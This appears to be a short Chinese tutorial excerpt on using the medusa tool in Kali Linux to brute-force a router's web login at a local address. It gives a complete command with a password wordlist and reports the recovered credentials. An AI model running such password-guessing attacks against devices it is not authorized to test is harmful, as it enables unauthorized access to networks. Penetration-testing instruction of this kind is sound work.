kali默认安装了该软件
#使用medusa暴力破解地址为192.168.5.1的路由器，执行命令如下所示：

medusa -h 192.168.5.1 -u admin -P /usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/john.txt -M http -e ns 80 -F

以上输出的信息是破解路由器密码的一个过程。
一般路由器默认的用户名和密码都是admin。但是通常，
用户会将密码进行修改。所以这里指定一个密码字典john.txt，
通过该字典对路由器进行暴力破解。从最后一行输出的信息，
可以看到路由器的用户名和密码分别为admin和daxueba。